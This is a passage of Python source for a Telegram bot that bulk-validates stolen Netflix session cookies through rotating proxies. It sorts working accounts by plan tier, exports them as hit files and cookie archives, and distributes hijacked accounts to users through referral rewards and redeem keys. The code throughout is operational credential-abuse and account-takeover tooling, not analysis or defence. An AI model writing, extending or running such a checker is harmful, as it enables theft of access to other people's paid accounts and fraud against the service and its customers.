                    if info.get('membership_status') == 'INACTIVE' or is_on_hold_account(info):
                        used.add(nid)
                        save_used(used)
                    continue

                if is_on_hold_account(info):
                    on_hold += 1
                    used.add(nid)
                    save_used(used)
                    continue

                plan_key, _, _ = derive_output_plan_bucket(info, True)
                plan_file = BASIC_FILE if plan_key == 'basic' else STANDARD_FILE if plan_key == 'standard' else PREMIUM_FILE
                async with pool_file_lock:
                    async with aiofiles.open(plan_file, 'a', encoding='utf-8') as f:
                        await f.write(nid + '\n')
                used.add(nid)
                save_used(used)
                existing_all.add(nid)
                added += 1
                active += 1

                if processed % 5 == 0 or processed == total_unique:
                    try:
                        await progress_msg.edit_text(
                            premium_emoji(f"⏳ Checking {total_unique} cookies...\n"
                                          f"Active/Added: {active}, Expired: {expired}, On Hold: {on_hold}, Bad: {bad}, Errors: {errors}\n"
                                          f"Progress: {processed}/{total_unique}"),
                            parse_mode='HTML'
                        )
                    except:
                        pass

                await asyncio.sleep(0.5)

            await get_pool_cached(force=True)
            counts = await get_pool_counts(force=True)

            summary = (
                f"✅ Admin upload complete!\n"
                f"📊 Total unique checked: {total_unique}\n"
                f"📈 Active (added to pool): {added}\n"
                f"⏳ Expired (skipped): {expired}\n"
                f"⏸️ On Hold (skipped): {on_hold}\n"
                f"❌ Invalid/Error: {bad}\n\n"
                f"📊 Updated pool:\n"
                f"  • Basic: {counts['basic']}\n"
                f"  • Standard: {counts['standard']}\n"
                f"  • Premium: {counts['premium']}\n"
                f"  • Total: {counts['basic'] + counts['standard'] + counts['premium']}"
            )
            await progress_msg.edit_text(premium_emoji(summary), parse_mode='HTML')

        except Exception as e:
            log.error(f"Admin upload error: {e}")
            await update.effective_message.reply_text(premium_emoji(f"❌ Upload failed: {str(e)[:200]}"), parse_mode='HTML')
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
        return

async def process_feedback_photo(update: Update, context: ContextTypes.DEFAULT_TYPE, pending: Dict):
    user = update.effective_user
    user_id = str(user.id)
    display = get_user_display(user_id, user.username)

    caption = (
        f"📸 **Netflix Feedback**\n"
        f"──────────────────────────\n"
        f"👤 User: {display}\n"
        f"🆔 ID: `{user.id}`\n"
        f"📋 Command: `{pending['type']}`\n"
        f"📧 Email: `{pending.get('email', 'N/A')}`\n"
        f"📦 Plan: `{pending.get('plan', 'N/A')}`\n"
        f"🕒 Timestamp: `{datetime.fromtimestamp(pending['timestamp']).isoformat()}`"
    )

    if FEEDBACK_CHANNEL:
        try:
            photo_file = update.message.photo[-1].file_id
            await context.bot.send_photo(
                chat_id=FEEDBACK_CHANNEL,
                photo=photo_file,
                caption=caption,
                parse_mode='Markdown'
            )
            await update.message.reply_text("✅ Screenshot forwarded to @dark_feedbacks. Thank you!")
        except Exception as e:
            log.error(f"Failed to send feedback photo: {e}")
            await update.message.reply_text(f"❌ Could not forward screenshot: {str(e)[:100]}")
    else:
        await update.message.reply_text("ℹ️ No feedback channel configured. Your feedback is noted.")
    clear_pending_feedback(user_id)

async def confirm_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        cookies = user_state.get(user_id, {}).get('cookies', [])
        if not cookies:
            await query.edit_message_text(premium_emoji("❌ No cookies to check. Upload first."), parse_mode='HTML')
            return
        if user_state.get(user_id, {}).get('busy'):
            await query.edit_message_text(premium_emoji("⚠️ Already running!"), parse_mode='HTML')
            return
        users, user = ensure_user(user_id, update.effective_user.username)
        is_prem = is_premium(user)
        is_admin = user.get("is_admin", False)
        if not is_admin and not is_prem:
            if user.get("mass_checked_cookies_today", 0) + len(cookies) > MASS_CHECK_DAILY_COOKIE_LIMIT:
                remaining = max(0, MASS_CHECK_DAILY_COOKIE_LIMIT - user.get("mass_checked_cookies_today", 0))
                await query.edit_message_text(
                    premium_emoji(f"❌ Daily mass check limit reached!\nYou can check {remaining} more cookies today.\nThis file has {len(cookies)} cookies."),
                    parse_mode='HTML'
                )
                return
        user_state[user_id]['stop'] = False
        user_state[user_id]['busy'] = True
        try:
            await query.message.delete()
        except:
            pass
        user_tasks[user_id] = context.application.create_task(
            process_cookies(chat_id, cookies, user_id, context, "check", update.effective_user.username)
        )

async def cancel_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Cancelled.")
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    async with user_locks[user_id]:
        user_state[user_id]['cookies'] = []
        user_state[user_id]['busy'] = False
    try:
        await query.message.delete()
    except:
        pass

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Stopped!")
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    async with user_locks[user_id]:
        if user_id in user_tasks:
            user_tasks[user_id].cancel()
        user_state[user_id]['busy'] = False
        user_state[user_id]['stop'] = True
        try:
            await query.message.delete()
        except:
            pass

async def clean_cookies_process(chat_id, content, user_id, context, filename):
    progress_msg = await context.bot.send_message(chat_id,
        premium_emoji("🧹 Purifying Cookies\n○○○○○  Analyzing..."),
        parse_mode='HTML')
    try:
        cookies = extract_netflix_cookies(content)
        if not cookies:
            await progress_msg.edit_text(premium_emoji("🧹 Purifying Cookies\n○○○○○  ❌ No NetflixId or ct tokens found!"), parse_mode='HTML')
            return

        await progress_msg.edit_text(
            premium_emoji(f"🧹 Purifying Cookies\n●●○○○  Found {len(cookies)} tokens..."),
            parse_mode='HTML')

        seen = set()
        unique = []
        for cookie in cookies:
            h = hashlib.sha256(json.dumps(cookie, sort_keys=True).encode()).hexdigest()
            if h not in seen:
                seen.add(h)
                unique.append(cookie)

        await progress_msg.edit_text(
            premium_emoji(f"🧹 Purifying Cookies\n●●●○○  {len(unique)} unique, creating files..."),
            parse_mode='HTML')

        txt_content = "\n".join([cookie.get('NetflixId', '') for cookie in unique if cookie.get('NetflixId')])
        txt_buffer = io.BytesIO(txt_content.encode('utf-8'))

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for idx, cookie in enumerate(unique, 1):
                ns = dict_to_netscape(cookie)
                zf.writestr(f"cookie_{idx}.txt", ns)

        await progress_msg.edit_text(
            premium_emoji(f"🧹 Purifying Cookies\n●●●●●  Done! {len(unique)} tokens extracted"),
            parse_mode='HTML')

        await context.bot.send_document(
            chat_id,
            document=InputFile(txt_buffer, filename="cleaned_cookies.txt"),
            caption=premium_emoji(f"📄 NetflixId tokens (one per line) – Total: {len(unique)}\n{WATERMARK}"),
            parse_mode='HTML')
        zip_buffer.seek(0)
        await context.bot.send_document(
            chat_id,
            document=InputFile(zip_buffer, filename="cleaned_cookies.zip"),
            caption=premium_emoji(f"📦 Netscape‑format cookie files – Total: {len(unique)}\n{WATERMARK}"),
            parse_mode='HTML')

        await progress_msg.delete()
    except Exception as e:
        await progress_msg.edit_text(premium_emoji(f"🧹 Error: {str(e)}"), parse_mode='HTML')

async def process_cookies(chat_id, cookies, user_id, context, mode, username=None):
    checked, hits, fails, free, holds = 0, 0, 0, 0, 0
    basic_hits, standard_hits, premium_hits = 0, 0, 0
    basic_list, standard_list, premium_list = [], [], []
    total = len(cookies)
    mode_text = "🧊 Account Check"

    global_stats["total_mass_checks"] += 1

    progress_msg = await context.bot.send_message(chat_id,
        premium_emoji(f"{mode_text}\n{'░'*dot_length} 0/{total}\n▸ Hits: 0 (B:0 S:0 P:0) | Holds: 0 | Free: 0 | Fails: 0"),
        parse_mode='HTML', reply_markup=STOP_MARKUP)

    loop = asyncio.get_running_loop()

    try:
        for batch_start in range(0, total, BATCH_SIZE):
            batch = cookies[batch_start:batch_start + BATCH_SIZE]
            async with user_locks[user_id]:
                if user_state.get(user_id, {}).get('stop'):
                    break
            futures = []
            for nm, ck in batch:
                nid = ck.get('NetflixId')
                if not nid:
                    continue
                proxy_str = random.choice(list(proxy_manager.proxies)) if proxy_manager.proxies else None
                proxy_dict = parse_proxy_line(proxy_str) if proxy_str else None
                futures.append(asyncio.wait_for(
                    loop.run_in_executor(GLOBAL_EXECUTOR, verify_cookie_wrapper, nid, proxy_dict),
                    timeout=REQUEST_TIMEOUT+10
                ))
            try:
                results = await asyncio.gather(*futures, return_exceptions=True)
            except asyncio.CancelledError:
                break
            async with user_locks[user_id]:
                if user_state.get(user_id, {}).get('stop'):
                    break

            for result in results:
                checked += 1
                if isinstance(result, Exception) or result is None:
                    fails += 1
                    continue

                if not result.get("ok"):
                    fails += 1
                    continue

                if result.get("on_payment_hold") == "Yes":
                    holds += 1
                    continue

                if result.get("premium"):
                    streams = result.get("max_streams", 0)
                    try:
                        streams = int(streams)
                    except:
                        streams = 0
                    hits += 1
                    if streams == 1:
                        basic_hits += 1
                        basic_list.append(result)
                    elif streams == 2:
                        standard_hits += 1
                        standard_list.append(result)
                    else:
                        premium_hits += 1
                        premium_list.append(result)
                else:
                    free += 1

            progress = checked / total if total > 0 else 0
            filled = int(progress * dot_length)
            bar = '▓' * filled + '░' * (dot_length - filled)
            text = (f"{mode_text}\n{bar} {checked}/{total}\n"
                    f"▸ Hits: {hits} (B:{basic_hits} S:{standard_hits} P:{premium_hits}) | Holds: {holds} | Free: {free} | Fails: {fails}")
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id,
                    text=premium_emoji(text), parse_mode='HTML', reply_markup=STOP_MARKUP)
            except:
                pass
            await asyncio.sleep(BATCH_DELAY)

    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass
    finally:
        user_state[user_id]['basic_list'] = basic_list
        user_state[user_id]['standard_list'] = standard_list
        user_state[user_id]['premium_list'] = premium_list
        user_state[user_id]['basic_hits'] = basic_hits
        user_state[user_id]['standard_hits'] = standard_hits
        user_state[user_id]['premium_hits'] = premium_hits

        async with user_locks[user_id]:
            user_state[user_id]['busy'] = False
            user_state[user_id]['stop'] = False
            if user_id in user_tasks:
                del user_tasks[user_id]

        await cleanup_user(user_id)

        users, user = ensure_user(user_id, username)
        if not user.get("is_admin", False) and not is_premium(user):
            user["mass_checked_cookies_today"] = user.get("mass_checked_cookies_today", 0) + total
            save_users(users)

        try:
            await progress_msg.delete()
        except:
            pass
        await context.bot.send_message(chat_id, premium_emoji("✅ Processing complete!"), parse_mode='HTML')

    if user_state.get(user_id, {}).get('stop'):
        await context.bot.send_message(chat_id, premium_emoji("⏹️ Stopped by user. No result files will be sent."), parse_mode='HTML')
        return

    all_hits = basic_list + standard_list + premium_list
    if all_hits:
        token_tasks = []
        for hit in all_hits:
            nid = hit.get('cookie', {}).get('NetflixId')
            if nid:
                token_tasks.append(get_cached_token(nid))
            else:
                token_tasks.append(asyncio.sleep(0, result=None))
        tokens = await asyncio.gather(*token_tasks)
        for hit, token in zip(all_hits, tokens):
            if token:
                hit['_token'] = token

    try:
        if basic_list or standard_list or premium_list:
            files_to_send = []

            def safe_build(cookie_list, label):
                content_parts = []
                for i, dd in enumerate(cookie_list, 1):
                    try:
                        content_parts.append(build_export_str(dd, i))
                    except Exception as e:
                        log.error(f"Failed to build {label} cookie {i}: {e}")
                        content_parts.append(f"========== HIT #{i} (ERROR) ==========\nError: {str(e)[:100]}")
                return "\n\n".join(content_parts) if content_parts else None

            if basic_list:
                content = safe_build(basic_list, "Basic")
                if content:
                    files_to_send.append(("Basic_Hits.txt", content))
            if standard_list:
                content = safe_build(standard_list, "Standard")
                if content:
                    files_to_send.append(("Standard_Hits.txt", content))
            if premium_list:
                content = safe_build(premium_list, "Premium")
                if content:
                    files_to_send.append(("Premium_Hits.txt", content))

            all_hits_for_export = basic_list + standard_list + premium_list
            if all_hits_for_export:
                content = safe_build(all_hits_for_export, "All")
                if content:
                    files_to_send.append(("All_Hits.txt", content))

            total_size = sum(len(c) for _, c in files_to_send)
            if total_size > 1024 * 1024:
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for fname, content in files_to_send:
                        zf.writestr(fname, content.encode('utf-8'))
                zip_buffer.seek(0)
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=InputFile(zip_buffer, filename="Hits.zip"),
                    caption=premium_emoji(f"📦 All hits (compressed)\n{WATERMARK}"),
                    parse_mode='HTML'
                )
            else:
                for fname, content in files_to_send:
                    try:
                        buf = io.BytesIO(content.encode('utf-8'))
                        await context.bot.send_document(
                            chat_id=chat_id,
                            document=InputFile(buf, filename=fname),
                            caption=premium_emoji(f"{WATERMARK}"),
                            parse_mode='HTML'
                        )
                    except Exception as e:
                        log.error(f"Failed to send {fname}: {e}")
                        await context.bot.send_message(chat_id, premium_emoji(f"⚠️ Could not send {fname} – {str(e)[:100]}"), parse_mode='HTML')

            summary_msg = (
                f"✅ Mass check complete!\n\n"
                f"Checked: {checked}\n"
                f"Hits (Premium): {hits}\n"
                f"  • Basic: {basic_hits}\n"
                f"  • Standard: {standard_hits}\n"
                f"  • Premium: {premium_hits}\n"
                f"Holds: {holds}\n"
                f"Free: {free}\n"
                f"Failed: {fails}\n\n"
                f"📤 Sent {len(files_to_send)} files."
            )

            await context.bot.send_message(chat_id, premium_emoji(summary_msg), parse_mode='HTML')

        else:
            msg = (f"✅ Done!\n\nChecked: {checked}\n"
                   f"Hits: 0\nHolds: {holds}\nFree: {free}\nFailed: {fails}\n\n"
                   "❌ No premium hits found.")
            await context.bot.send_message(chat_id, premium_emoji(msg), parse_mode='HTML')
    except Exception as e:
        log.error(f"Critical error while sending results: {e}")
        await context.bot.send_message(
            chat_id,
            premium_emoji(f"⚠️ Error sending results: {str(e)[:200]}\nCheck completed: {checked} cookies, {hits} hits."),
            parse_mode='HTML'
        )

async def check_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if str(user_id) in [str(a) for a in ADMIN_IDS] or user_id in ADMIN_IDS:
        return True
    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            continue
    return True

async def require_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.effective_user:
        return False
    user_id = update.effective_user.id
    users, user = ensure_user(str(user_id))
    if await check_membership(user_id, context):
        user["joined_channels"] = True
        save_users(users)
        return True

    missing = []
    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                missing.append(channel)
        except:
            missing.append(channel)
    keyboard = []
    for channel in missing:
        link = CHANNEL_LINKS.get(channel, f"https://t.me/{channel[1:]}")
        keyboard.append([InlineKeyboardButton(f"📢 Join {channel}", url=link)])
    keyboard.append([InlineKeyboardButton("✅ I've joined", callback_data="check_join")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = (
        "🔒 Access Restricted\n\n"
        "You must join the following channels to use this bot:\n"
        + "\n".join(f"• {ch}" for ch in missing) +
        "\n\nAfter joining, click the button below to verify."
    )
    await update.effective_message.reply_text(premium_emoji(msg), reply_markup=reply_markup, parse_mode='HTML')
    user["joined_channels"] = False
    save_users(users)
    return False

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = query.from_user.id
    users, user = ensure_user(str(user_id))
    try:
        await query.message.delete()
    except:
        pass

    if await check_membership(user_id, context):
        user["joined_channels"] = True
        save_users(users)

        pending_ref = context.user_data.get('pending_referral')
        user_is_new = context.user_data.get('user_is_new', False)

        if pending_ref and user_is_new and user.get("referred_by") is None:
            referrer_id = pending_ref
            if referrer_id != str(user_id) and referrer_id in users:
                user["referred_by"] = referrer_id
                referrer = users[referrer_id]
                referrer["pending_premium"] = referrer.get("pending_premium", 0) + 1
                referrer["referral_count"] = referrer.get("referral_count", 0) + 1
                save_users(users)
                try:
                    await context.bot.send_message(
                        chat_id=int(referrer_id),
                        text=premium_emoji("🎉 You got a new referral! +1 Premium cookie earned. Use /claim to get it."),
                        parse_mode='HTML'
                    )
                except Exception:
                    pass
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=premium_emoji("✅ Referral recorded! Your referrer earned a Premium cookie."),
                    parse_mode='HTML'
                )
            else:
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=premium_emoji("⚠️ Invalid referral link or you already have a referrer."),
                    parse_mode='HTML'
                )
        elif pending_ref and not user_is_new:
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=premium_emoji("ℹ️ Referral links only work for new users. You already have an account."),
                parse_mode='HTML'
            )

        context.user_data.pop('pending_referral', None)
        context.user_data.pop('user_is_new', None)

        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=premium_emoji("✅ All channels joined! You can now use the bot.\nUse /start to see your status."),
            parse_mode='HTML'
        )
    else:
        missing = []
        for channel in REQUIRED_CHANNELS:
            try:
                member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
                if member.status not in ["member", "administrator", "creator"]:
                    missing.append(channel)
            except:
                missing.append(channel)
        keyboard = []
        for channel in missing:
            link = CHANNEL_LINKS.get(channel, f"https://t.me/{channel[1:]}")
            keyboard.append([InlineKeyboardButton(f"📢 Join {channel}", url=link)])
        keyboard.append([InlineKeyboardButton("✅ I've joined", callback_data="check_join")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = "⚠️ You are still missing some channels:\n" + "\n".join(f"• {ch}" for ch in missing) + "\n\nPlease join them and click the button again."
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=premium_emoji(msg),
            reply_markup=reply_markup,
            parse_mode='HTML'
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "dist_get":
        await get(update, context)
    elif data == "dist_premium":
        await premium_status(update, context)
    elif data == "dist_redeem":
        await query.message.reply_text(premium_emoji("Usage: /redeem KEY"), parse_mode='HTML')
    elif data == "dist_referral":
        await referral(update, context)
    elif data == "dist_check":
        await query.answer("Type /nfcheck NetflixId")
        await query.message.reply_text(premium_emoji("Usage: /nfcheck NetflixId or raw token"), parse_mode='HTML')
    elif data == "dist_admin":
        await admin_panel(update, context)
    elif data == "dist_help":
        await help_command(update, context)
    elif data == "dist_claim":
        await claim_command(update, context)
    elif data.startswith("split_"):
        await split_callback(update, context)

async def feedback_broadcast_loop(bot):
    global feedback_broadcast_interval
    while True:
        if bot is None:
            await asyncio.sleep(60)
            continue
        if feedback_broadcast_interval <= 0:
            await asyncio.sleep(60)
            continue
        await asyncio.sleep(feedback_broadcast_interval * 60)
        try:
            users = load_users()
            sent = 0
            failed = 0
            for uid, user in users.items():
                if user.get("pending_feedback"):
                    try:
                        username = user.get("username")
                        display = get_user_display(uid, username)
                        msg = premium_emoji(
                            f"⏰ **Reminder:** You have a pending screenshot request for your last `{user['pending_feedback']['type']}` command.\n"
                            f"Please send the screenshot **now** to complete the process.\n"
                            f"If you already sent it, ignore this message."
                        )
                        await bot.send_message(chat_id=int(uid), text=msg, parse_mode='HTML')
                        sent += 1
                        await asyncio.sleep(0.05)
                    except Exception as e:
                        log.error(f"Failed to send broadcast to {uid}: {e}")
                        failed += 1
            log.info(f"Feedback broadcast complete: sent={sent}, failed={failed}")
        except Exception as e:
            log.error(f"Error in feedback_broadcast_loop: {e}")

async def periodic_proxy_check():
    while True:
        await asyncio.sleep(PROXY_CHECK_INTERVAL * 60)
        log.info("🔄 Running periodic proxy health check...")
        proxies = list(proxy_manager.proxies)
        if not proxies:
            continue
        checker = ProxyChecker(timeout=5)
        live = await checker.check_all(proxies, target=0, threads=50)
        if live:
            proxy_manager.proxies = set(p for p, _ in live)
            await proxy_manager.save_to_file_async(PROXY_FILE)
            log.info(f"✅ Periodic check: {len(live)} alive proxies kept.")
        else:
            log.warning("⚠️ Periodic check: no alive proxies found.")

async def log_memory():
    tracemalloc.start()
    while True:
        await asyncio.sleep(300)
        current, peak = tracemalloc.get_traced_memory()
        log.info(f"Memory: current={current/1024/1024:.2f} MB, peak={peak/1024/1024:.2f} MB")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log.exception("Exception while handling update:", exc_info=context.error)
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text(
                premium_emoji("⚠️ An error occurred. Please try again or contact the admin."),
                parse_mode='HTML'
            )
        except:
            pass

if __name__ == "__main__":
    import asyncio, sys, traceback

    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    for f in [USERS_FILE, KEYS_FILE, USED_FILE, BASIC_FILE, STANDARD_FILE, PREMIUM_FILE]:
        if not os.path.exists(f):
            with open(f, 'w') as _: pass

    print("=" * 50)
    print("  NF Bot - Final Ultimate Edition")
    print("=" * 50)
    print(f"  Pool: {loop.run_until_complete(get_pool_counts())}")
    print(f"  Proxies: {len(proxy_manager.proxies)}")
    print(f"  {WATERMARK}")
    print("=" * 50)
    print("🔄 Auto-restart enabled – will restart on crash.")

    feedback_task = None

    while True:
        try:
            app = ApplicationBuilder().token(TOKEN).build()

            app.add_handler(CommandHandler("start", start))
            app.add_handler(CommandHandler("help", help_command))
            app.add_handler(CommandHandler("link", link_command))
            app.add_handler(CommandHandler("tv", tv_command))
            app.add_handler(CommandHandler("get", get))
            app.add_handler(CommandHandler("premium", premium_status))
            app.add_handler(CommandHandler("redeem", redeem))
            app.add_handler(CommandHandler("referral", referral))
            app.add_handler(CommandHandler("claim", claim_command))
            app.add_handler(CommandHandler("nfcheck", check_cookie))
            app.add_handler(CommandHandler("admin", admin_panel))
            app.add_handler(CommandHandler("keys", keys_command))
            app.add_handler(CommandHandler("check", check_proxies_command))
            app.add_handler(CommandHandler("clearfeedback", clear_feedback_command))
            app.add_handler(CommandHandler("addproxy", add_proxy_command))
            app.add_handler(CommandHandler("addprotxt", add_proxy_file_command))
            app.add_handler(CommandHandler("ban", ban_user))
            app.add_handler(CommandHandler("unban", unban_user))
            app.add_handler(CommandHandler("listusers", list_users))
            app.add_handler(CommandHandler("broadcast", broadcast_command))
            app.add_handler(CommandHandler("bdfb", bdfb_command))
            app.add_handler(CommandHandler("listfb", list_feedback_pending))
            app.add_handler(CommandHandler("clearfb", clearfb_command))
            app.add_handler(CommandHandler("autoban", autoban_command))
            app.add_handler(CommandHandler("ufile", ufile_command))

            app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_(check|clean|split|tvlogin)$"))
            app.add_handler(CallbackQueryHandler(confirm_check, pattern="^confirm_check$"))
            app.add_handler(CallbackQueryHandler(cancel_check, pattern="^cancel_check$"))
            app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_check$"))
            app.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
            app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
            app.add_handler(CallbackQueryHandler(button_callback, pattern="^(dist_|split_)"))

            app.add_handler(MessageHandler(filters.Document.ALL & filters.ChatType.PRIVATE, file_upload))
            app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.PRIVATE & ~filters.COMMAND, handle_message))
            app.add_handler(MessageHandler(filters.PHOTO & filters.ChatType.PRIVATE, handle_message))

            app.add_error_handler(error_handler)

            if feedback_task is not None:
                feedback_task.cancel()
            feedback_task = loop.create_task(feedback_timeout_checker(app.bot))
            loop.create_task(feedback_broadcast_loop(app.bot))
            loop.create_task(periodic_proxy_check())
            loop.create_task(log_memory())

            print("✅ Bot started successfully. Press Ctrl+C to stop.")
            live()
            app.run_polling(allowed_updates=Update.ALL_TYPES)

        except (KeyboardInterrupt, SystemExit):
            print("🛑 Bot stopped by user.")
            break

        except Exception as e:
            print(f"❌ Bot crashed: {e}")
            print("Traceback:")
            traceback.print_exc()
            print("⏳ Restarting in 5 seconds...")
            time.sleep(5)
            continue